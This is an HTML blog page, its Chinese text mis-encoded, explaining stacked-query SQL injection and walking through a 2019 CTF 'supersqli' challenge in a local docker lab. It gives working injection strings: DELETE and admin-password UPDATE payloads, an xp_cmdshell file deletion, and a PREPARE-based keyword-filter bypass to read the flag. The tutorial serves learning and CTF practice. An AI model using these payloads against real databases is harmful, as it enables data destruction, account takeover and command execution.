<!-- Post layout -->
<!DOCTYPE html>
<html>
<head>
<!-- Introducing the head tag -->

<!-- Begin Jekyll SEO tag v2.6.1 -->
<title>SQLæ³¨å…¥-å †å æ³¨å…¥ | sueisok</title>
<meta name="generator" content="Jekyll v3.8.6" />
<meta property="og:title" content="SQLæ³¨å…¥-å †å æ³¨å…¥" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="å †å æ³¨å…¥ğŸ¤’" />
<meta property="og:description" content="å †å æ³¨å…¥ğŸ¤’" />
<link rel="canonical" href="http://localhost:4000/blog/sqli-stacked-queries/" />
<meta property="og:url" content="http://localhost:4000/blog/sqli-stacked-queries/" />
<meta property="og:site_name" content="sueisok" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-04-08T10:10:57+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="SQLæ³¨å…¥-å †å æ³¨å…¥" />
<meta name="twitter:site" content="@your_name" />
<meta name="google-site-verification" content="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"SQLæ³¨å…¥-å †å æ³¨å…¥","dateModified":"2020-04-08T10:10:57+08:00","datePublished":"2020-04-08T10:10:57+08:00","url":"http://localhost:4000/blog/sqli-stacked-queries/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/sqli-stacked-queries/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/banner.png"}},"description":"å †å æ³¨å…¥ğŸ¤’","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

<script type="application/ld+json">
    {
      "@context": "http://schema.org/",
      "@type": "Person",
      "image": /assets/JHON.jpg,
      "honorificPrefix": "MD.",
      "name": sueisok,
      "familyName": Your family name,
      "honorificSuffix": King,
      "disambiguatingDescription": Your awesome description,
      "birthPlace": Your address,
      "birthDate": Your Date of Birth,
      "height": XX inches,
      "gender": Your gender,
      "memberOf": Your awesome orgranization,
      "nationality": Your proud nationality,
      "jobTitle": Your Respectful Position,
      "knowsAbout": Your awesome Skill,
      "knowsLanguage": ,
      "email": ,
      "url": " http://localhost:4000 ",
      "test": 
      "worksFor": {
        "@type": ,
        "name": ,
        "openingHours": ,
        "priceRange": ,
        "telephone": ,
        "image": ,
        "address": {
        "@type": ,
        "addressCountry": ,
        "addressLocality": ,
        "addressRegion": 
         }
      },
      "address": {
        "@type": ,
        "addressCountry": ,
        "addressLocality": ,
        "addressRegion": 
      },
      "colleague": [
        "https://deb108471.dhakaeducationboard.gov.bd",
        "https://deb113652.dhakaeducationboard.gov.bd",
        "https://deb110880.dhakaeducationboard.gov.bd"
      ]
    }
</script>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-sclable=0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="description" content="Notes,Thoughts and Else" />
<meta name="keywords" content="123456" />

<!-- preloader -->
<link rel="stylesheet" href="http://localhost:4000/assets/css/preloader.css">

<!-- Favicon -->
<link href="/assets/icon.png" rel="shortcut icon" />
<link href="/assets/icon.png" rel="apple-touch-icon-precomposed" />
<!-- Android Lolipop Theme Color -->
<!-- <meta name="theme-color" content="#1464FB"> -->
<title>SQLæ³¨å…¥-å †å æ³¨å…¥</title>
<!-- Baidu statistics -->

<!-- Google Analytics -->

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', '');
</script>


<!-- Android Lolipop Theme Color -->
<meta name="theme-color" content=" rgb(122,103,138) ">
</head>
<body onload="loaderFunc()" data-spy="scroll" data-target="#toc" data-offset="20">


<!-- preloader -->
<div id="loader" class="loader">
  <div class="artboard">
    <div class="square"></div>
    <div class="path">
      <div class="small-squares">
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
      </div>
    </div>
  </div>
</div>
<!-- end -->

<!-- Top anchor -->
<a id="htmlup" name="htmlup"></a>
<!-- Introduce blog post options -->

<header id="post-header" style="background-color:rgb(122,103,138);">
  <div class="top-center">
      <div class="logo">
          <a href="/" title="my awesome webtitle" style="color: white;">sueisok</a>
      </div>
      <nav class="top-nav">
          <ul>
              
                <li><a href="/" style="color: white;">Home</a></li>
              
                <li><a href="/tags/" style="color: white;">Tags</a></li>
              
                <li><a href="/timeline/" style="color: white;">Timeline</a></li>
              
                <li><a href="/about/" style="color: white;">About</a></li>
              
                <li><a href="/reLink/" style="color: white;">reLink</a></li>
              
          </ul>
      </nav>
      <div id="top-boot">
        <a href="javascript:;" id="boot1" style="display:block;" onclick="document.getElementById('boot-area').style.display='block';document.getElementById('boot1').style.display='none';document.getElementById('boot2').style.display='block';"><img src="/assets/boot_white.png" alt=""></a>
        <a href="javascript:;" id="boot2" style="display: none;" onclick="document.getElementById('boot-area').style.display='none';document.getElementById('boot1').style.display='block';document.getElementById('boot2').style.display='none';"><img src="/assets/boot_white.png" alt=""></a>
      </div>
  </div>

</header>


<!-- Introducing the mobile dropdown option -->
<div id="boot-area">
    <ul>
        
          <a href="/"><li>Home</li></a>
        
          <a href="/tags/"><li>Tags</li></a>
        
          <a href="/timeline/"><li>Timeline</li></a>
        
          <a href="/about/"><li>About</li></a>
        
          <a href="/reLink/"><li>reLink</li></a>
        
    </ul>
</div>

<!-- Introducing the blog post style -->
<!-- Version one garbage -->
<!-- <div class="wow fadeIn top" data-wow-duration="3.5s" >
    <span class="wow fadeInUp" data-wow-delay="0.2s">SQLæ³¨å…¥-å †å æ³¨å…¥</span>
    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
    <span class="wow fadeInUp" data-wow-delay="0.6s">Author&nbsp;&nbsp;|&nbsp;&nbsp;true</span>
</div> -->

<!--Version 2 switchable page -->

<div class="post-top" style="background-color:rgb(122,103,138);">
  <!-- Page width is greater than 800px -->
  <div class="left-area">
    
      <a href="javascript:;" class="btn bounceInLeft animated" onmouseover="showLeft();this.style.color='rgb(122,103,138)';" onmouseout="goneLeft();this.style.color='rgba(0,0,0,.2)';"><</a>
      <div id="left-tab" style="display:none;"><span class="left-san"></span><span class="left-main" style="color:rgb(122,103,138);"><sapn class="main">No previous page</sapn></span></div>
    
  </div>
  <div class="post-titlearea">
    <span class="wow fadeInUp" data-wow-delay="0.2s">SQLæ³¨å…¥-å †å æ³¨å…¥</span>
    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
    <!-- <span class="wow fadeInUp" data-wow-delay="0.6s">Author&nbsp;&nbsp;|&nbsp;&nbsp;true</span> -->
  </div>
  <div class="right-area">
    
      <a href="/blog/wfuzz1/" class="btn bounceInRight self-animated" onmouseover="showRight();this.style.color='rgb(122,103,138)';" onmouseout="goneRight();this.style.color='rgba(0,0,0,.2)';">></a>
      <div id="right-tab" style="display:none;"><span class="right-san"></span><span class="right-main" style="color:rgb(122,103,138);"><sapn class="main">Wfuzzçš„å…¶ä»–æ¨¡å—</sapn></span></div>
    
  </div>

  <!-- Page width is less than 800px -->
  <div class="post-changearea">
    
      <a href="javascript:;" class="leftchange" style="border-right: 1px solid rgb(122,103,138);border-bottom: 2px solid rgb(122,103,138);"><span><br>No previous one</span></a>
    
    
      <a href="/blog/wfuzz1/" class="rightchange" style="border-left: 1px solid rgb(122,103,138);border-bottom: 2px solid rgb(122,103,138);"><span>Next<br><br>Wfuzzçš„å…¶ä»–æ¨¡å—</span></a>
    
  </div>
</div>


<div class="markdown-body fadeInUp animated">
  

    
      <div class="postpage-subtitle" style="border-left: 8px solid rgb(122,103,138); border-right: 8px solid rgb(122,103,138)">
        Stacked Queries
      </div>
    
  

  <!-- Article content -->
 <ul id="markdown-toc">
  <li><a href="#stacked-queries" id="markdown-toc-stacked-queries">Stacked Queries</a>    <ul>
      <li><a href="#principle" id="markdown-toc-principle">Principle</a></li>
      <li><a href="#stacked-queries-limitations" id="markdown-toc-stacked-queries-limitations">Stacked Queries Limitations</a></li>
      <li><a href="#altering-data" id="markdown-toc-altering-data">Altering Data</a></li>
      <li><a href="#calling-stored-procedures" id="markdown-toc-calling-stored-procedures">Calling Stored Procedures</a></li>
    </ul>
  </li>
  <li><a href="#ein-beispiel" id="markdown-toc-ein-beispiel">Ein Beispiel</a>    <ul>
      <li><a href="#æ€è·¯" id="markdown-toc-æ€è·¯">æ€è·¯</a></li>
    </ul>
  </li>
  <li><a href="#refer" id="markdown-toc-refer">Refer</a></li>
</ul>
<p><code class="highlighter-rouge">å †å æ³¨å…¥</code>ğŸ¤’</p>

<p><code class="highlighter-rouge">å †æŸ¥è¯¢æ³¨å…¥</code>ğŸ¤’</p>

<p><code class="highlighter-rouge">å †æ³¨å…¥</code>ğŸ¤’</p>

<p>ğŸ¤”å®³ï¼Œå…¶å®å°±æ˜¯å¤šè¯­å¥æ³¨å…¥ï¼Œç”¨åˆ†å·ã€‚</p>

<p>è¿™ç¯‡æ–‡ç« å…ˆç¿»è¯‘ä¸€ä¸ªä¸çŸ¥é“ä»å“ªçœ‹æ¥çš„è®²å †å æ³¨å…¥çš„æ–‡ç« ï¼Œundå¤ç°å¼ºç½‘æ¯2019çš„ä¸€ä¸ªé¢˜ç›®</p>

<h1 id="stacked-queries">Stacked Queries</h1>

<p>å…ˆç¿»è¯‘ä¸€ä¸‹<a href="https://www.sqlinjection.net/stacked-queries/">SQLæ³¨å…¥ç½‘ç«™ä¸­çš„ä¸€ç¯‡æ–‡ç« </a></p>

<blockquote>
  <p>Execute multiple statements in the same query to extend the possibilities of SQL injections.</p>
</blockquote>

<p>åœ¨ä¸€ä¸ªæŸ¥è¯¢ä¸­æ‰§è¡Œå¤šä¸ªè¯­å¥ï¼Œä»¥æ‰©å±•SQLæ³¨å…¥çš„å¯èƒ½æ€§ã€‚</p>

<blockquote>
  <p>Stacked queries provide a lot of control to the attacker. By terminating the original query and adding a new one, it will be possible to modify data and call stored procedures. This technique is massively used in SQL injection attacks and understanding its principle is essential to a sound understanding of this security issue.</p>
</blockquote>

<p>å †å æ³¨å…¥ä¸ºæ”»å‡»è€…æä¾›äº†å¾ˆå¤§çš„æ§åˆ¶æƒã€‚ç”¨ç»“æŸåŸå§‹çš„æŸ¥è¯¢æ·»åŠ æ–°è¯­å¥çš„æ–¹å¼ï¼Œå°±å¯èƒ½å¯¹æ•°æ®è¿›è¡Œæ”¹åŠ¨ï¼Œæˆ–è€…æ‰§è¡Œç¨‹åºã€‚å¾ˆå¤šSQLæ³¨å…¥æ”»å‡»éƒ½æ˜¯ä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œäº†è§£ä»–çš„åŸç†å¯¹æ­£ç¡®äº†è§£è¿™ä¸€å®‰å…¨é—®é¢˜å¾ˆé‡è¦ã€‚</p>

<h2 id="principle">Principle</h2>

<blockquote>
  <p>In SQL, a semicolon indicates that the end of a statement has been reached and what follows is a new one. This allows executing multiple statements in the same call to the database server. Contrary to UNION attacks which are limited to SELECT statements, stacked queries can be used to execute any SQL statement or procedure. A classic attack using this technique could look like the following.</p>
</blockquote>

<p>åœ¨SQLè¯­å¥ä¸­ï¼Œåˆ†å·æ„å‘³ç€ä¸€æ®µè¯­å¥çš„ç»“æŸï¼Œåé¢æ˜¯å¦ä¸€æ®µæ–°çš„è¯­å¥ï¼Œè¿™å°±å…è®¸åœ¨ä¸€ä¸ªè¯·æ±‚ä¸­æ‰§è¡Œå¤šä¸ªè¯­å¥ã€‚ä¸UNIONæŸ¥è¯¢æ”»å‡»å¯¹SELECTçš„é™åˆ¶ç›¸åï¼Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œä»»ä½•çš„SQLè¯­å¥å’Œç¨‹åºï¼Œä¸€ä¸ªç»å…¸çš„æ”»å‡»åˆ©ç”¨å¦‚ä¸‹ã€‚</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MALICIOUS</span> <span class="k">USER</span> <span class="k">INPUT</span><span class="p">.</span>
<span class="mi">1</span><span class="p">;</span> <span class="k">DELETE</span> <span class="k">FROM</span> <span class="n">products</span>
<span class="o">//</span><span class="err">æ¶æ„ç”¨æˆ·è¾“å…¥</span>

<span class="k">GENERATED</span> <span class="n">QUERY</span> <span class="k">WITH</span> <span class="n">MULTIPLE</span> <span class="n">STATEMENTS</span><span class="p">.</span> <span class="n">THE</span> <span class="k">PARAMETER</span> <span class="n">PRODUCTID</span> <span class="n">WAS</span> <span class="k">NOT</span> <span class="n">SANITIZED</span><span class="p">.</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">productid</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="k">DELETE</span> <span class="k">FROM</span> <span class="n">products</span>
<span class="o">//</span><span class="err">æ„æˆçš„æ¶æ„è¯­å¥</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">THE PARAMETER PRODUCTID WAS NOT SANITIZED.</code>çš„æ„æ€æ˜¯<code class="highlighter-rouge">PRODUCTID</code>å‚æ•°æœªæ¸…é™¤ã€‚</p>

<blockquote>
  <p>When the query is executed, a product is returned by the first statement and all products are deleted by the second.</p>
</blockquote>

<p>è¯·æ±‚æ‰§è¡Œåï¼Œè¿”å›ç¬¬ä¸€ä¸ªè¯­å¥æŸ¥è¯¢çš„idä¸º1çš„<code class="highlighter-rouge">product</code>ï¼Œç¬¬äºŒæ­¥åˆ é™¤è¡¨ä¸­æ‰€æœ‰å†…å®¹ã€‚</p>

<h2 id="stacked-queries-limitations">Stacked Queries Limitations</h2>

<blockquote>
  <p>It is important to mention that query stacking does not work in every situation. Most of the time, this kind of attack is impossible because the API and/or database engine do not support this functionality. Insufficient rights could also explain why the attacker is unable to modify data or call some procedures.</p>
</blockquote>

<p>å€¼å¾—ä¸€æçš„æ˜¯å †å æ³¨å…¥ä¸æ˜¯åœ¨æ‰€æœ‰æƒ…å†µä¸‹éƒ½å¯ä»¥ç”¨ï¼Œä¸æ”¯æŒçš„APIæˆ–æ•°æ®åº“å°±ä¸å¯ä»¥ç”¨ï¼Œæƒé™ä¸è¶³ä¹Ÿå¯èƒ½ä½¿å¾—ä¸èƒ½ä¿®æ”¹æ•°æ®æˆ–æ‰§è¡Œç¨‹åºã€‚</p>

<blockquote>
  <p>Below is a list of query stacking support by the principal API and DBMS.</p>
</blockquote>

<p>ä»¥ä¸‹æ˜¯æ”¯æŒå †å æ³¨å…¥çš„APIæˆ–æ•°æ®åº“ã€‚</p>

<pre><code class="language-mysql">STACKED QUERY SUPPORT.

MySQL/PHP - Not supported (supported by MySQL for other API).

SQL Server/Any API - Supported.

Oracle/Any API - Not supported.
</code></pre>

<table>
  <thead>
    <tr>
      <th>API and DBMS</th>
      <th>SUPPORT</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>MySQL/PHP</td>
      <td>ä¸æ”¯æŒï¼Œæ”¯æŒMySQLå’Œå…¶ä»–API</td>
    </tr>
    <tr>
      <td>SQL Server/Any API</td>
      <td>æ”¯æŒ</td>
    </tr>
    <tr>
      <td>Oracle/Any API</td>
      <td>ä¸æ”¯æŒ</td>
    </tr>
  </tbody>
</table>

<blockquote>
  <p>Even though we mentioned earlier that stacked queries can add any SQL statement, this injection technique is frequently limited when it comes to adding SELECTs. Both statements will be executed but software code is usually designed to handle the results returned by only one query. Consequently, the injected SELECT query will often generate an error or its results will simply be ignored. For this reason it is recommended to use UNION attacks when trying to extract data.</p>
</blockquote>

<p>å°½ç®¡æˆ‘ä»¬å‰é¢è¯´è¿‡å †å æ³¨å…¥å¯ä»¥æ·»åŠ ä»»æ„çš„SQLè¯­å¥ï¼Œä½†æ˜¯å¯¹äºæ·»åŠ <code class="highlighter-rouge">SELECT</code>çš„è¯­å¥æ—¶ï¼Œè¿™ç§æ³¨å…¥æ–¹å¼ç»å¸¸å—é™ã€‚è™½ç„¶ä¸¤æ¡è¯­å¥éƒ½å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯ç¨‹åºé€šå¸¸åªè¿”å›ä¸€ä¸ªè¯­å¥çš„æŸ¥è¯¢æ•°æ®ï¼Œæ³¨å…¥<code class="highlighter-rouge">SELECT</code>è¯­å¥ç»å¸¸ä¼šå‡ºé”™æˆ–è€…ç»“æœè¢«å¿½ç•¥ï¼Œå› æ­¤å»ºè®®ä½¿ç”¨<code class="highlighter-rouge">UNION</code>æ³¨å…¥æå–æ•°æ®ã€‚</p>

<blockquote>
  <p>One last thing needs to be mentionned: to inject a valid SQL segment, the attacker will need to know some basic information such as table names, column names, etc. For more information refer to the section dedicated to information gathering.</p>
</blockquote>

<p>æœ€åéœ€è¦æé†’çš„æ˜¯æ³¨å…¥SQLæ—¶ï¼Œæ”»å‡»è€…éœ€è¦çŸ¥é“ä¸€äº›åŸºæœ¬çš„ä¿¡æ¯ï¼Œæ¯”å¦‚æ•°æ®è¡¨åã€æ•°æ®åº“åˆ—åä¹‹ç±»çš„ã€‚æ›´å¤šçš„ä¿¡æ¯ï¼Œå‚ç…§ä¿¡æ¯æ”¶é›†çš„éƒ¨åˆ†ã€‚</p>

<h2 id="altering-data">Altering Data</h2>

<blockquote>
  <p>The example presented at the beginning of the article demonstrates how query stacking can be used to delete information from the database. Instead of destroying data, attackers usually try to steal it or grant themselves high privileges on the system. A frequent approach is to change the administratorâ€™s password. The example below illustrates a classic data modification using SQL injection.</p>
</blockquote>

<p>æ–‡ç« å‰é¢çš„ä¾‹å­å±•ç¤ºäº†å †å æ³¨å…¥å¯ä»¥åˆ é™¤æ•°æ®åº“ä¿¡æ¯ï¼Œæ¯”èµ·è¿™ä¸ªï¼Œæ”»å‡»è€…é€šå¸¸ä¼šå°è¯•çªƒå–æ•°æ®ï¼Œæˆ–è€…æå‡è‡ªå·±çš„ç³»ç»Ÿæƒé™ã€‚ä¸€ä¸ªå¸¸è§„æ“ä½œå°±æ˜¯ä¿®æ”¹ç³»ç»Ÿç®¡ç†å‘˜çš„å¯†ç ï¼Œä¸‹é¢çš„ä¾‹å­å°†æ¼”ç¤ºä¸€ä¸ªç»å…¸çš„SQLæ³¨å…¥ä¿®æ”¹æ“ä½œã€‚</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">USER</span> <span class="k">INPUT</span><span class="p">.</span>
<span class="mi">1</span><span class="p">;</span> <span class="k">UPDATE</span> <span class="n">members</span> <span class="k">SET</span> <span class="n">password</span><span class="o">=</span><span class="s1">'pwd'</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'admin'</span>
<span class="o">//</span><span class="err">ç”¨æˆ·æ¶æ„è¾“å…¥</span>

<span class="k">GENERATED</span> <span class="n">QUERY</span><span class="p">.</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">categoryid</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="k">UPDATE</span> <span class="n">members</span> <span class="k">SET</span> <span class="n">password</span><span class="o">=</span><span class="s1">'pwd'</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'admin'</span>
<span class="o">//</span><span class="err">æ„æˆçš„æ¶æ„è¯­å¥</span>
</code></pre></div></div>

<h2 id="calling-stored-procedures">Calling Stored Procedures</h2>

<blockquote>
  <p>Calling a procedure can bring SQL injections attacks to a whole new level. Nowadays, many database management systems come with built in packages of functions and procedures to simplify development and provide new functionalities. Therefore, it becomes possible to communicate with network, control the operating system and do even more from a simple SQL statement.</p>
</blockquote>

<p>æ‰§è¡Œç¨‹åºå¯ä»¥æŠŠSQLæ³¨å…¥æ”»å‡»æé«˜ä¸€ä¸ªæ¡£æ¬¡ã€‚å¦‚ä»Šå¾ˆå¤šæ•°æ®åº“ç®¡ç†ç³»ç»Ÿä¼šå°†æ–¹æ³•å’Œè¿‡ç¨‹æ‰“åŒ…ï¼Œä»¥ç®€åŒ–å¼€å‘ï¼Œæä¾›æ–°åŠŸèƒ½ï¼Œå› æ­¤å°±å¯èƒ½ä¸äº’è”ç½‘äº¤äº’ï¼Œé€šè¿‡ç®€å•çš„SQLè¯­å¥æ§åˆ¶æ“ä½œç³»ç»Ÿæˆ–è€…æ›´æ·±å…¥ã€‚</p>

<blockquote>
  <p>As there is no convention between DBMS regarding to packages and procedures name, the attacker will have to identify which database system is used before trying to call a built-in procedure. From there, the principle is the same as examples presented earlier except that the injected query is a stored procedure call. Let see how it can be done with the use of xp_shellcmd; a SQL Serverâ€™s specific command which allows executing operating system calls.</p>
</blockquote>

<p>ç”±äºæ•°æ®åº“çš„åŒ…å’Œè¿‡ç¨‹åæ²¡æœ‰å…³è”ï¼Œå› æ­¤åœ¨æ‰§è¡Œç¨‹åºå‰æ”»å‡»è€…å¿…é¡»ç¡®å®šè¢«æ”»å‡»æ•°æ®åº“çš„ç§ç±»ã€‚è¿™ä¸ªåŸç†å’Œä¹‹å‰æåˆ°çš„ä¾‹å­ä¸­çš„éœ€è¦ç¡®å®šè¡¨åç­‰ä¿¡æ¯ä¸€æ ·ï¼Œåªä¸è¿‡æŸ¥è¯¢è¯­å¥æ˜¯æ‰§è¡Œå­˜å‚¨çš„ç¨‹åºã€‚<code class="highlighter-rouge">xp_shellcmd</code>æ˜¯ä¸€ä¸ª<code class="highlighter-rouge">SQL Server</code>çš„ç‰¹æ®Šè¯­å¥ï¼Œå¯ä»¥æ‰§è¡Œæ“ä½œç³»ç»Ÿç¨‹åºï¼Œæ¥çœ‹ä¸€ä¸‹æ‰§è¡Œç¨‹åºæ˜¯æ€ä¹ˆåšåˆ°çš„ã€‚</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">USER</span> <span class="k">INPUT</span><span class="p">.</span>
<span class="mi">1</span><span class="p">;</span> <span class="k">exec</span> <span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span> <span class="s1">'DEL important_file.txt'</span>
<span class="o">//</span><span class="err">ç”¨æˆ·æ¶æ„è¾“å…¥</span>

<span class="k">GENERATED</span> <span class="n">QUERY</span><span class="p">.</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">categoryid</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="k">exec</span> <span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span> <span class="s1">'DEL important_file.txt'</span>
<span class="o">//</span><span class="err">æ„æˆçš„æ¶æ„è¯­å¥</span>
</code></pre></div></div>

<blockquote>
  <p>The query above will return a product list and delete â€œimportant_file.txtâ€. A much more complex attack could have been launched to take control over the operating system, but this is outside the scope of this article. The injected statement is not limited to built-in packages; a user-defined procedure could also be called. This approach is not frequent but it could be useful in some specific cases.</p>
</blockquote>

<p>ä»¥ä¸ŠæŸ¥è¯¢ä¼šè¿”å›<code class="highlighter-rouge">categoryid=1</code>çš„äº§å“åˆ—è¡¨ï¼Œå¹¶åˆ é™¤<code class="highlighter-rouge">important_file.txt</code>ï¼Œæ›´å¤æ‚çš„æ”»å‡»å¯èƒ½ä¼šè·å¾—æ“ä½œç³»ç»Ÿçš„æ§åˆ¶ï¼Œä½†æ˜¯è¿™è¶…å‡ºäº†è¿™ç¯‡æ–‡ç« çš„èŒƒå›´ã€‚æ³¨å…¥è¯­å¥ä¹Ÿä¸é™äºå†…ç½®çš„åŒ…ï¼Œç”¨æˆ·è‡ªå®šä¹‰çš„ç¨‹åºä¹Ÿå¯èƒ½è¢«åˆ©ç”¨æ‰§è¡Œï¼Œè¿™ä¸ªæ”»å‡»æ–¹æ³•ä¸æ˜¯å¾ˆæ™®é€‚ä½†åœ¨æŸäº›ç‰¹æ®Šæƒ…å†µä¸‹æ˜¯æœ‰ç”¨çš„ã€‚</p>

<h1 id="ein-beispiel">Ein Beispiel</h1>

<p>ä¸€ä¸ªä¾‹å­æ¥è‡ªå¼ºç½‘æ¯2019ï¼Œ<a href="https://github.com/CTFTraining/qwb_2019_supersqli">å¤ç°ç¯å¢ƒ</a>ï¼Œ<code class="highlighter-rouge">clone</code>æ”¾åˆ°<code class="highlighter-rouge">ubuntu</code>é‡Œï¼Œå¯åŠ¨<code class="highlighter-rouge">docker</code></p>

<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/1.png" alt="avatar" /></p>

<p>è¾“å…¥ä¸€ä¸ªå°å°çš„å•å¼•å·</p>

<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/2.png" alt="avatar" /></p>

<p>æŠ¥é”™äº†ï¼Œè¯´æ˜å¯èƒ½å­˜åœ¨SQLæ³¨å…¥æ¼æ´</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1' or '1'='1 #
</code></pre></div></div>

<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/3.png" alt="avatar" /></p>

<p>è¿”å›äº†ä¸€äº›æ•°æ®ï¼Œè¯´æ˜å­˜åœ¨SQLæ³¨å…¥æ¼æ´æ— ç–‘</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1' order by 3 # 
</code></pre></div></div>

<p>è¿”å›é”™è¯¯</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1' order by 2 # 
</code></pre></div></div>

<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/4.png" alt="avatar" /></p>

<p>è¿”å›æ­£ç¡®ï¼Œå¯ä»¥åˆ¤æ–­è¯¥è¡¨æœ‰ä¸¤åˆ—</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1' union select 1,2 #
</code></pre></div></div>

<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/5.png" alt="avatar" /></p>

<p><code class="highlighter-rouge">select</code>å…³é”®è¯è¢«è¿‡æ»¤äº†ï¼ŒåŠ <code class="highlighter-rouge">/**/</code>ï¼Œæ›¿æ¢å¤§å°å†™éƒ½ä¸èƒ½ç»•è¿‡å»ã€‚</p>

<p>è¿™æ—¶å°è¯•å †å æ³¨å…¥ï¼Œå°è¯•åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ï¼š</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1';show databases; #
</code></pre></div></div>

<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/6.png" alt="avatar" /></p>

<p>æœ‰<code class="highlighter-rouge">ctftraining</code>ã€<code class="highlighter-rouge">information_schema</code>ã€<code class="highlighter-rouge">mysql</code>ã€<code class="highlighter-rouge">performance_schema</code>ã€<code class="highlighter-rouge">supersqli</code>ã€<code class="highlighter-rouge">test</code>6ä¸ªæ•°æ®åº“</p>

<p>å°è¯•åˆ—å‡ºå½“å‰æ•°æ®åº“çš„è¡¨ï¼š</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1';show tables; #
</code></pre></div></div>

<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/7.png" alt="avatar" /></p>

<p>æœ‰<code class="highlighter-rouge">1919810931114514</code>ã€<code class="highlighter-rouge">words</code>ä¸¤ä¸ªè¡¨ã€‚</p>

<p>å°è¯•è·å–è¡¨çš„åˆ—åï¼š</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1';show columns from words;
</code></pre></div></div>

<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/9.png" alt="avatar" /></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1';show columns from `1919810931114514`;
</code></pre></div></div>

<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/8.png" alt="avatar" /></p>

<p>æ¥ä¸‹æ¥å°±è¦è¯»å–æ•°æ®äº†ï¼Œä½†æ˜¯å…³é”®è¯éƒ½è¢«è¿‡æ»¤äº†ã€‚</p>

<p>çœ‹åˆ°ä¸¤ç§è§£é¢˜æ€è·¯ï¼Œä¸€ç§æ˜¯æŠŠå…³é”®è¯åˆ†å¼€å†™ç„¶åæ‹¼æ¥ï¼Œä¸€ç§æ˜¯å°†1919810931114514é‡å‘½åä¸ºwordsï¼Œå°†flagæ”¹ä¸ºidã€‚æ„Ÿè§‰é‡å‘½åäº†ä»¥åå°±ç®—æ˜¯ä¿®æ”¹äº†åŸæœ¬æ•°æ®ï¼Œæ‰€ä»¥é€‰æ‹©æ‹¼æ¥å…³é”®è¯çš„æ–¹æ³•ã€‚</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;
</code></pre></div></div>

<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/10.png" alt="avatar" /></p>

<h2 id="æ€è·¯">æ€è·¯</h2>

<p>ğŸ’åŠ å•å¼•å·è¯•æ¢ï¼Œæœ‰æ—¶å€™ä¹Ÿå¯ä»¥è¯•ä¸€ä¸‹æ²¡æœ‰å•å¼•å·æˆ–è€…æ‹¬å·æˆ–è€…åŒå¼•å·ï¼ŒåŸç†å°±æ˜¯å°è¯•é—­åˆå‰ä¸€ä¸ªè¯­å¥</p>

<p>ğŸ’åˆ¤æ–­åˆ—æ•°ï¼Œ<code class="highlighter-rouge">order by</code></p>

<p>ğŸ’select åˆ—æ•°ï¼Œå‘ç°å…³é”®å­—è¢«è¿‡æ»¤ï¼Œå°è¯•å †å æ³¨å…¥</p>

